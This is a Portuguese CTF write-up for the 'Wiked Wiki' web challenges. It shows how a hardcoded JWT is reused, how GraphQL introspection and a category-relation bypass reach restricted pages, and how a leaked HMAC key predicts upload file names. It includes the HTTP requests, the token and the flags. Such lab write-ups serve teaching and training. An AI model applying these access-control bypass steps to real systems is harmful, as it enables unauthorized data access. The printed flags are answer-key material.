# Trilha de Desafios ~ Wiked Wiki

## Talk is Cheap, Show Me the Code!

Ao utilizar as *Ferramentes de Desenvolvedor*, podemos analisar o código fonte *JavaScript* da página inicial e localizar o seguinte arquivo `index.js`:

```javascript
... 

const FLAG = "TAC{98df942e78b89d3941e9767e73cba98c31ab7e3c40f3b7694d44aa6358385ce9}"

const client = new ApolloClient({
  uri: '/graphql',
  cache: new InMemoryCache(),
});

... 

// @TODO fix Auth
// const httpLink = createHttpLink({
//   uri: '/graphql',
// });

// const authLink = setContext((_, { headers }) => {
//   // get the authentication token from local storage if it exists
//   const token = localStorage.getItem('token');
//   // return the headers to the context so httpLink can read them
//   return {
//     headers: {
//       ...headers,
//       authorization: token ? `Bearer ` : "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUiLCJuYW1lIjoiQWxleGFuZGVyIEhhcnJpc29uIiwidXNlcm5hbWUiOiJhbGV4X2hhcnJpc29uIiwiZW1haWwiOiJhbGV4YW5kZXIuaGFycmlzb25Ad2lja2VkY29ycC5jb20iLCJyb2xlIjp7ImlkIjoiMSIsIm5hbWUiOiJFbXBsb3llZSJ9LCJpYXQiOjE3MDAwOTA0MDR9.gwBdNrw9jHvpABrwni4xeuc1koycKh39l5xmJUyZ7SE",

...
```

Nele conseguimos obter as seguintes informações:

- A presença de uma API GraphQL no path `/graphql`;
- Um *token* de autorização JWT presente no código comentado;
- A flag do desafio.

- **Flag:** `TAC{98df942e78b89d3941e9767e73cba98c31ab7e3c40f3b7694d44aa6358385ce9}`

## Security Inspection

Sabendo que se trata de uma API GraphQL, é possível verificar que o mecanismo de *Introspection* encontra-se habilitado. Ao utilizar tal mecanismo, o jogador será capaz de obter todas as *queries* disponíveis para serem utilizadas. A imagem a seguir ilustra o *Schema* da API utilizando a ferramenta *GraphQL Voyager*:

![](./images/WICKED_WIKI_Schema_Graphql.png)

Ao tentar realizar consultas para alguma *query*, por exemplo `roles`, percebemos que a aplicação responde com a mensagem: "You are not authorized to see this page.". Para evitar, tal mensagem, precisamos utilizar o *token* obtido no desafio anterior e enviar, junto das nossas requisições HTTP, o seguinte cabeçalho:

```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUiLCJuYW1lIjoiQWxleGFuZGVyIEhhcnJpc29uIiwidXNlcm5hbWUiOiJhbGV4X2hhcnJpc29uIiwiZW1haWwiOiJhbGV4YW5kZXIuaGFycmlzb25Ad2lja2VkY29ycC5jb20iLCJyb2xlIjp7ImlkIjoiMSIsIm5hbWUiOiJFbXBsb3llZSJ9LCJpYXQiOjE3MDAwOTA0MDR9.gwBdNrw9jHvpABrwni4xeuc1koycKh39l5xmJUyZ7SE
```

Com isso, conseguimos obter acesso completo a quase todas as consultas e encontrar a *flag* na *query* *development*

```http
POST /graphql HTTP/1.1
Host: localhost:4001
Content-Length: 40
content-type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUiLCJuYW1lIjoiQWxleGFuZGVyIEhhcnJpc29uIiwidXNlcm5hbWUiOiJhbGV4X2hhcnJpc29uIiwiZW1haWwiOiJhbGV4YW5kZXIuaGFycmlzb25Ad2lja2VkY29ycC5jb20iLCJyb2xlIjp7ImlkIjoiMSIsIm5hbWUiOiJFbXBsb3llZSJ9LCJpYXQiOjE3MDAwOTA0MDR9.gwBdNrw9jHvpABrwni4xeuc1koycKh39l5xmJUyZ7SE
Connection: close

{"query": "query {\n    development\n}"}
```

```http
HTTP/1.1 200 OK
X-Powered-By: Express
cache-control: no-store
Content-Type: application/json; charset=utf-8
Content-Length: 249
ETag: W/"f9-/OI0CqwBVA23X/BhP9bHaTjTOWY"
Date: Sun, 26 Nov 2023 22:26:10 GMT
Connection: close

{"data":{"development":"{\"status\":\"ok\",\"version\":\"develop-0.9.2\",\"flag\":\"TAC{69763c166cc0fcff891ceb609ccc0d550539272910c247a2ade9aeb1fec4737d}\",\"filenameHmacKey\":\"4d7be1d49d435b689c1e9f909cdcd4d0266674dbc56191d0178d6264ff87a937\"}"}}

```

Note que, além da flag, também é possível obter um ***filenameHmacKey***, que será útil nos desafios posteriores.

- **Flag**: `TAC{69763c166cc0fcff891ceb609ccc0d550539272910c247a2ade9aeb1fec4737d}`

## Pathfinder

Após configurar o cabeçalho *Authorization*, podemos notar que a *query* *page*, que recebe como parâmetro o ID de uma página, ainda retorna a mensagem de acesso não autorizado. Vamos então análisar o conteúdo do *token* JWT:

```json
{
  "id": "5",
  "name": "Alexander Harrison",
  "username": "alex_harrison",
  "email": "alexander.harrison@wickedcorp.com",
  "role": {
    "id": "1",
    "name": "Employee"
  },
  "iat": 1700090404
}
```

Podemos perceber, que o *token* pertence ao usuário Alexander Harrison. Podemos buscar então, utilizando a query *pages*, alguma página que o mesmo seja o autor e verificar se o mesmo possui acesso:

![](./images/WICKED_WIKI_Query_Pages.png)

Note que a página de id 29 foi criada pelo usuário que estamos interessando, a imagem a seguir ilustra a tentativa de consultar o conteúdo da página 29:

![](./images/WICKED_WIKI_Query_Page_29.png)

Sucesso! Encontramos uma página em que é possível obter seu conteúdo sem ser bloqueado pelo sistema. 

Para finalizar, analisando novamente o *schema* demonstrado na ferramenta Voyager, note que existem dois caminhos para acessar uma página:

- Consultando diretamente pelo seu ID, por meio da query `page(id: $ID)`; ou
- Acessando indiretamente por meio de outra página, por meio da relação **page -> categories -> pages**.

Note que, no segundo caso, é preciso contar com a sorte de que as páginas que desejamos alcançar possuam categorias em comum com alguma página que já possuamos acesso inicial (que será o nosso caso). Logo, a imagem a seguir exibe a query utilizada para realizar a obtenção da flag:

![](./images/WICKED_WIKI_Flag.png)

```json
{"id":"26","title":"Aviso de Desligamento de Funcionário - Natalie Walker","content":"\nAviso de Desligamento de Funcionário - Natalie Walker:\n\n**Motivos para o Desligamento:**\n1. Violação de Acordos de Não Divulgação (NDA): Natalie Walker quebrou acordos de confidencialidade, representando um risco significativo para os interesses da empresa.\n2. Menosprezo à Cultura da Empresa: Engajamento em comportamentos prejudiciais a um ambiente de trabalho positivo e inclusivo.\n3. Insubordinação: Falha em seguir instruções gerenciais e diretrizes da empresa.\n4. Ameaças Legais: Fazer ameaças de ação legal contra a empresa.\n\nEsta decisão segue uma investigação minuciosa e uma consideração cuidadosa dos fatos. Desejamos a Natalie Walker sucesso em seus empreendimentos futuros.\n\nAnexo: [Offboard_Natalie.pdf](http://{baseUrl}/uploads/67404be69188a4a930213d5987903591.pdf)","hasAttachment":true,"flag":"TAC{454368a6cdfa4fa069627495d2da909f691de7398e04bd71879719c256aaf99a}"},
```

- **Flag:** `TAC{454368a6cdfa4fa069627495d2da909f691de7398e04bd71879719c256aaf99a}`

## Digital Signatures

Analisando o conteúdo da página em que obtemos a flag anterior, é possível reparar a presença de um *link* para download do seguinte arquivo PDF:

```md
[Offboard_Natalie.pdf](http://{baseUrl}/uploads/67404be69188a4a930213d5987903591.pdf)
```

Revisitando as demais *queries* presentes na API, vamos analisar novamente a resposta retornada ao solicitarmos os *assets* da aplicação:

![](./images/WICKED_WIKI_Query_Assets.png)

Note que no atributo *downloadLink* podemos encontrar a seguinte expressão: `${uploadPath}/${computeFilename($filename,$key)}.${getFileExt($filename)}`.

Além disso, lembre-se que foi possível obter uma chave Hmac na resposta da *query* *development*, sendo ela:

```json
{"filenameHmacKey":"4d7be1d49d435b689c1e9f909cdcd4d0266674dbc56191d0178d6264ff87a937"}
```

Logo, juntando todas as peças e analisando a *hash* `67404be69188a4a930213d5987903591`, podemos concluir que a aplicação utilizou uma função **HMAC MD5** aplicada no nome do arquivo para armazená-lo no servidor. 

Por fim, aplicando a mesma mesma função no nome do arquivo **New_Culture_Manifest.pdf**, conseguimos construir o *link* em que o segundo PDF se encontra:

- `http://{basePath}/uploads/e5db2d584ea0659eaafe34104861c40b.pdf`

- **Flag:** `TAC{dd11af7b65881444c4611d5bd2d3e6972ab9be46b682bff71c5c2140b89a3d17}`

## Bonus: Company Values

A última *flag* encontra-se no mesmo PDF do desafio anterior. Para encontrá-la, o jogador deverá perceber que o PDF possui uma segunda página em branco e que nela possui trechos de texto também escritos em branco. Ao copiar e colar o conteúdo do PDF em um bloco de notas é possível obter a flag.

- **Flag:** `TAC{6a2e8e751076217efdacdbba739fef5fddcfa8d5c7a3c0e2c83baa16aacff09d}`